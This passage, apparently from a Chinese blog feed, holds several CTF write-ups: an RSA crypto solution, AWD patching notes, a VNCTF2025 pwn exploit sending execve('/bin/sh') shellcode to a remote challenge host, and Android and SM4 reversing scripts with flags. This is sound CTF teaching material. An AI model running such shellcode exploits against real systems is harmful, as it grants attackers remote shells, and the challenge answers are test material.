class="hljs-number">16589591418165998974581826396786398930964677585495811776727961980933761422829735502353148344295573923286904134270437840953903058835839647755304524379802201214055337473450626274233655129393993402170849111556891293771331425620727538676892779730518697214030981259596934139791367918170334793203308313793877432632961965570796244678476654144496744143529230273615880581380427053580163718759461912665013484259971242478070197232015833303583839630233529678406449192276948304869831793199422773169924034486860859583248462580782763862788640533350445627327551313451358489108372802941755051199397457477170827875256791335279931822163</span><br><span class="hljs-number">3493216727040563603182782528379980992856985367672705061437847758429330967495522030591464555965123991215415707741373551781505882160952702665400598213557438002105417986620056775684429778017927694129314364830399810114133029099512289718032317103775152997628020077046730276692573860628045483306212242357668089602247503892447592293405654694663877541319208584675706845250157767477676729786680662467437147092154919231870894123001829518759712475631380741564021398432758657752054575552932354155897193050199905632726139361666588240188296480829032211689007858038874564883755261054886137380859036520919514155990974745414052260391</span><br><span class="hljs-number">738711933947319822947673544397020570805588025177977860210346384599836444962386731037122249298437342058548865629696263398136643393798229605137124995991851470790761577269526848178263795501303172468316859219648198031139444340434290922490343059376784633680231755992893833495307272749496959826984455403224845257667388721423164198610039775635522398580665978800318363980423481678985219561212776853383645384028341490465579340909534811109967923304778965393247025954945989704145828423228694680674422850911134777381837444273593086003338565398835125386790498932704847535695287327571603796733691600956198673926829061013653722889</span><br>==================================================================<br></code></pre></td></tr></table></figure><img src="/2025/02/26/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734436239071-c4101845-118b-4120-bb46-882212a6c1b7.png" class="" title="img"><p>crypto2中指数为n-p-q，尝试<em>（514 * p - 114 * q），这样就能构造欧拉定理，（514 * p - 114 * q）</em>hint在模n下互逆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols,solve<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><br>n=<span class="hljs-number">26714373031565422475884702170543410883373766932797969939280017108800123630280453788616378655019907797321111510231223356874948261879543789404350524004468888206101183893553783912724380985843610867526595833197366734130545820436239872839652589346601722085131378640769423529086811124172931366238980772713375464558442159355269775101329989966189515569376297816482517053422913115432001741932739141823138624540815101536913889794642390866813927702475029110686952078530692644252976502169483149132207976114466199894323910052111367201536776408811236973236608134901114724266365223503175620708205259026706410636563563598898057786909</span><br>c=<span class="hljs-number">18858506514752992181380154921747008058551432073649358179756400934499734929302097177385112589545638411907187544107364140903835767319765333083263371380171393252284034199968302788035813879025587162178319401359969618990483649417087485156561735201401525887885578022049717026480327032286788738889262482959544912750982820940453807386818377755465477978307315597575247620998533718055915017425523414691659570184139579810707813137941428133321379443751166951391551543594842911886444134180462626200534122766826612914831934523911294746691771890773567919420040686512711305345502628357059345018604242583923374930982823519300498861640</span><br>hint1=<span class="hljs-number">1703011784973694423523066984917892124619751172220144100044171439741165827972687390194124492251819042874252053150043202421782626869660480593115676811212128468596849367155081033328244384876406655473674390204200669968111480368833514298396052119966333625037144526212890106844115852680816838761270006004920982100788509334477038784632813857002635218</span><br>hint2=<span class="hljs-number">8596233896763717102169465608296028563515760739865995489935176725834214423578223747479973270599042824129419113680720794797661942367252581426481246316950815033131044242281997122567448742644673474903897866662886581037133335517704055756596838356619756825253469733432939827965726694808136837419859121356935545730046078254006901859741103020585105901848211173408398897737180145151960784779409091748948609728701125179059580873942337600282247998167059927473965882018545884</span><br><br><span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> product(<span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">12</span>), repeat=<span class="hljs-number">2</span>):<br>    q = gcd(a * (hint1+<span class="hljs-number">0x114</span>) - b * (hint2+<span class="hljs-number">0x514</span>), n)<br>    <span class="hljs-keyword">if</span> q != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> q &lt; n:<br>        <span class="hljs-keyword">break</span><br><br>p = n // q<br>e = <span class="hljs-number">0x10001</span><br>d = invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br>flag1 = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag1)<br><br>n2=<span class="hljs-number">16589591418165998974581826396786398930964677585495811776727961980933761422829735502353148344295573923286904134270437840953903058835839647755304524379802201214055337473450626274233655129393993402170849111556891293771331425620727538676892779730518697214030981259596934139791367918170334793203308313793877432632961965570796244678476654144496744143529230273615880581380427053580163718759461912665013484259971242478070197232015833303583839630233529678406449192276948304869831793199422773169924034486860859583248462580782763862788640533350445627327551313451358489108372802941755051199397457477170827875256791335279931822163</span><br>c2=<span class="hljs-number">3493216727040563603182782528379980992856985367672705061437847758429330967495522030591464555965123991215415707741373551781505882160952702665400598213557438002105417986620056775684429778017927694129314364830399810114133029099512289718032317103775152997628020077046730276692573860628045483306212242357668089602247503892447592293405654694663877541319208584675706845250157767477676729786680662467437147092154919231870894123001829518759712475631380741564021398432758657752054575552932354155897193050199905632726139361666588240188296480829032211689007858038874564883755261054886137380859036520919514155990974745414052260391</span><br>hint=<span class="hljs-number">738711933947319822947673544397020570805588025177977860210346384599836444962386731037122249298437342058548865629696263398136643393798229605137124995991851470790761577269526848178263795501303172468316859219648198031139444340434290922490343059376784633680231755992893833495307272749496959826984455403224845257667388721423164198610039775635522398580665978800318363980423481678985219561212776853383645384028341490465579340909534811109967923304778965393247025954945989704145828423228694680674422850911134777381837444273593086003338565398835125386790498932704847535695287327571603796733691600956198673926829061013653722889</span><br>e = <span class="hljs-number">65537</span><br><br>x = inverse(hint, n2)<br><br>solver = Solver()<br><br>p = Int(<span class="hljs-string">&#x27;p&#x27;</span>)<br>q = Int(<span class="hljs-string">&#x27;q&#x27;</span>)<br><br>solver.add(<span class="hljs-number">514</span> * p - <span class="hljs-number">114</span> * q == x)<br>solver.add(p * q == n2)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    model = solver.model()<br>    p_val = model[p].as_long()<br>    q_val = model[q].as_long()<br><br>    d = inverse(<span class="hljs-number">0x10001</span>, (p_val - <span class="hljs-number">1</span>) * (q_val - <span class="hljs-number">1</span>))<br>    m = <span class="hljs-built_in">pow</span>(c2, d, n2)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;flag&#123;bb38781f-f3f4-46c0-956b-e34809406e0c&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024上海市赛决赛</title>
    <link href="/2025/02/23/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B/"/>
    <url>/2025/02/23/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>今天的pwn就属于要么都别想打，要么大部分人都没修好，会被批量打</p><p>一上来直接搜字符串，看看有没有open(‘&#x2F;flag’)或者system这种,直接把read的字节改小，这样一直到20轮两道pwn都没有被打</p><p>两个函数都有read，后面想着其实可以把17和22行的数字1给改掉，因为别人也不知道是啥</p><img src="/2025/02/23/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B/1717837104759-f21fb79d-b563-42e1-a33e-89805223589d.png" class="" title="img"><img src="/2025/02/23/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B/1717835955103-aea717ac-ab2b-4970-af11-1e967d05fd55.png" class="" title="img"><p>后面被打又去看了一下，觉得pwn1是典型的off by one，刚好尧哥昨天讲过怎么修，直接全部nop发现就没被打了，之后发现flag还是会被read，但是因为提前修改只能读一个字节</p><img src="/2025/02/23/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B/1717836749041-9787fe8a-7090-4ad9-88cc-c2fab0c10037.png" class="" title="img"><p>后面pwn2挺阴险的，倒数第二轮才打进来，最大malloc是0x4f+1<img src="/2025/02/23/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B/1719924109530-af392741-38ef-4651-ad08-e25473a9ee08.png" class="" title="img"></p><p>add函数最小也是0x4f+1，这个时候会造成堆叠，修的话把上面的大于换成大于等于就行</p><img src="/2025/02/23/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B/1719924324662-967d47e1-3ba4-4750-bd5b-da8ccfc30edf.png" class="" title="img"><p><strong>经验总结</strong></p><p>1.前一天得先看看xshell和xftp能不能用，第二天才发现缺32位的msvrc110.dll库，最好都装着</p><p>2.pwn题端口要nmap自己扫，md队友说了一直没去试</p><p>3.堆里面off by null和off by one常考，得会打</p><p>4.还有就是批量提交脚本，应该有两种提交方式，下次打之前得会写</p><p>5.规则还得研究清楚，到底宕机扣不扣分，这次好像没扣</p>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>awd_pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2025部分Pwn与Reverse</title>
    <link href="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/"/>
    <url>/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1738999531360-a39871a2-1265-486b-8ccc-64b461ed0c0a.png" class="" title="img"><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739005361582-9da085b2-e416-46a1-9fb2-9e0bd25a897e.png" class="" title="img"><p>这题会把rsp置0，也就是说用系统生成的shellcode没用</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739005350423-7d24494a-123d-4de6-949b-6ef729da0d79.png" class="" title="img"><p>考虑用ret2syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node.vnteam.cn&#x27;</span>,<span class="hljs-number">45311</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):    <br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;    </span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)    <br>    attach(io,bk)  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov al,59</span><br><span class="hljs-string">add rdi,8</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-comment">#debug()</span><br>s(shellcode)<br>inter()<br></code></pre></td></tr></table></figure><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="hook-fish"><a href="#hook-fish" class="headerlink" title="hook_fish"></a>hook_fish</h2><p>加载资源</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016398519-e32dac73-5afc-4209-b36d-d3d8f453bc8d.png" class="" title="img"><p>得到hook_fish.dex</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739014258915-192f023d-b5c1-450a-a7de-39fc5c30387a.png" class="" title="img"><p>从输入经过encrypt函数，后面调用loadclass方法</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016537563-fc776926-5d08-4ff1-9a7a-7a6f28f35258.png" class="" title="img"><p>encode方法加载hook_fish的encode方法，然后加载hook_fish的check方法比较</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016667231-d800b539-4a0e-4361-a835-ca759dc44344.png" class="" title="img"><p>check方法里面找到密文，发现hook_fish的encode方法用HashMap在做映射</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016785826-9f878d15-ab10-4ae7-a551-1f403c36302f.png" class="" title="img"><p>先根据密文找到映射前的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HookFish</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.fish_dcode = &#123;&#125;<br>        self.fish_ecode = &#123;&#125;<br>        self.strr = <span class="hljs-string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span><br>        self.decode_map()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_map</span>(<span class="hljs-params">self</span>):<br>        self.fish_dcode = &#123;<br>            <span class="hljs-string">&quot;iiijj&quot;</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&quot;jjjii&quot;</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&quot;jijij&quot;</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&quot;jjijj&quot;</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&quot;jjjjj&quot;</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&quot;ijjjj&quot;</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <br>            <span class="hljs-string">&quot;jjjji&quot;</span>: <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&quot;iijii&quot;</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&quot;ijiji&quot;</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&quot;iiiji&quot;</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&quot;jjjij&quot;</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&quot;jijji&quot;</span>: <span class="hljs-string">&#x27;l&#x27;</span>, <br>            <span class="hljs-string">&quot;ijiij&quot;</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&quot;iijji&quot;</span>: <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&quot;ijjij&quot;</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&quot;jiiji&quot;</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&quot;ijijj&quot;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&quot;jijii&quot;</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <br>            <span class="hljs-string">&quot;iiiii&quot;</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&quot;jjiij&quot;</span>: <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&quot;ijjji&quot;</span>: <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&quot;jiiij&quot;</span>: <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&quot;iiiij&quot;</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&quot;iijij&quot;</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <br>            <span class="hljs-string">&quot;jjiji&quot;</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&quot;jijjj&quot;</span>: <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&quot;iijjl&quot;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&quot;iiilj&quot;</span>: <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&quot;iliii&quot;</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&quot;jiili&quot;</span>: <span class="hljs-string">&#x27;4&#x27;</span>, <br>            <span class="hljs-string">&quot;jilji&quot;</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&quot;iliji&quot;</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&quot;jjjlj&quot;</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&quot;ijljj&quot;</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&quot;iljji&quot;</span>: <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&quot;jjjli&quot;</span>: <span class="hljs-string">&#x27;0&#x27;</span><br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span></span>):<br>        result = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>), <span class="hljs-number">5</span>): <br>            fragment = <span class="hljs-built_in">str</span>[i:i+<span class="hljs-number">5</span>]<br>            result.append(self.fish_dcode.get(fragment, <span class="hljs-string">&#x27;?&#x27;</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(result)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    hook_fish = HookFish()<br>    decoded_str = hook_fish.decode(hook_fish.strr)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decoded string: &quot;</span>, decoded_str)<br><span class="hljs-comment">#0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5</span><br></code></pre></td></tr></table></figure><p>然后按照encrypt逆向即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5&#x27;</span><br>s1=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># for i in range(len(s)):</span><br><span class="hljs-comment">#     for j in range(48,127):</span><br><span class="hljs-comment">#         k=j</span><br><span class="hljs-comment">#         if k&gt;=97 and k&lt;=97+25:</span><br><span class="hljs-comment">#             tmp=k-49+(i%4)</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             tmp=k+ord(&#x27;7&#x27;)+(i%10)</span><br><span class="hljs-comment">#         if tmp==ord(s[i]):</span><br><span class="hljs-comment">#             print(chr(j),end=&quot;&quot;)</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#a9297889a8fb9b3a6b9a870b57db3afa2b47bb3ac84739fa3a1bdb3aaa5779ca56570b1c</span><br>s2=<span class="hljs-string">&#x27;a9297889a8fb9b3a6b9a870b57db3afa2b47bb3ac84739fa3a1bdb3aaa5779ca56570b1c&#x27;</span><br>s3=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># print(&#x27;\n&#x27;)</span><br><span class="hljs-comment"># for i in range(0,len(s2),2):</span><br><span class="hljs-comment">#     s3+=s2[i+1]+s2[i]</span><br><span class="hljs-comment"># print(s3)</span><br><br><span class="hljs-comment">#9a9287988abfb9a3b6a978b075bda3afb274bba38c7493afa3b1bda3aa7597ac6575b0c1</span><br>s3=<span class="hljs-string">&#x27;9a9287988abfb9a3b6a978b075bda3afb274bba38c7493afa3b1bda3aa7597ac6575b0c1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s3),<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(s3[i]+s3[i+<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">68</span>),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>app逆向</tag>
      
      <tag>syscall</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>patch</title>
    <link href="/2025/02/05/patch/"/>
    <url>/2025/02/05/patch/</url>
    
    <content type="html"><![CDATA[<p>used for a reverse problem named sm4 in MoeCTF2024</p><p>当题目给了解密函数或者加解密对称的函数有一些特殊的方法，可以不去逆算法</p><img src="/2025/02/05/patch/1724231748225-bb19b32d-2991-4049-8f97-acc29d85d459.png" class="" title="img"><ul><li><code>**4C**</code>: 这是 <code>REX</code> 前缀，用于扩展寄存器和操作数的大小。<code>4C</code> 指定了指令使用扩展的 64 位寄存器（在此指令中为 <code>r8</code>），并且涉及到 <code>r8</code> 这一高位寄存器</li><li><code>**8D**</code>: 这是 <code>LEA</code>指令的操作码</li><li><code>**45 10**</code>: 这是操作数的 ModR&#x2F;M 字节和位移量。<code>45</code> 表示目标寄存器是 <code>r8</code>（4D的时候表示rcx)，源操作数的基址寄存器是 <code>rbp</code>，并且有一个 8 位符号扩展的位移量。<code>10</code> 是位移量</li></ul><img src="/2025/02/05/patch/1724231033107-e06ceffd-7d82-49af-9660-e9ea668816c9.png" class="" title="img"><p>栈结构如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">-0000000000000120 ; Frame size: 120; Saved regs: 8; Purge: 0<br><br>-0000000000000100 enc             db 48 dup(?)          ; enc: 48字节<br>-00000000000000D0 Data_plain      db 48 dup(?)          ; Data_plain: 48字节<br>-00000000000000A0 key             db 16 dup(?)          ; key: 16字节<br>-0000000000000090 decode_Result   db 50 dup(?)          ; decode_Result: 50字节<br>-0000000000000050 encode_Result   db 50 dup(?)          ; encode_Result: 50字节<br>-0000000000000012 len             db ?                  ; len: 1字节<br>-0000000000000011 i               db ?                  ; i: 1字节<br>+0000000000000000  s              db 8 dup(?)           ; s: 8字节<br>+0000000000000008  r              db 8 dup(?)           ; r: 8字节<br></code></pre></td></tr></table></figure><p>A0-50&#x3D;50,所以上图黄色位置为50</p><p>现在要改为enc，A0-100&#x3D;-60，变成A0,相当于把加密后的数据快速改成密文，也可以调试的时候一位位改</p><img src="/2025/02/05/patch/1724144757695-5141af2c-9c55-43a9-a4d2-c56ffa3e62d4.png" class="" title="img"><p>输入长度为48位（题目要求）的时候正常输出flag</p><img src="/2025/02/05/patch/1724228737010-235a7104-10ec-47aa-9b54-9978af1259d8.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Reverse常见算法</title>
    <link href="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/"/>
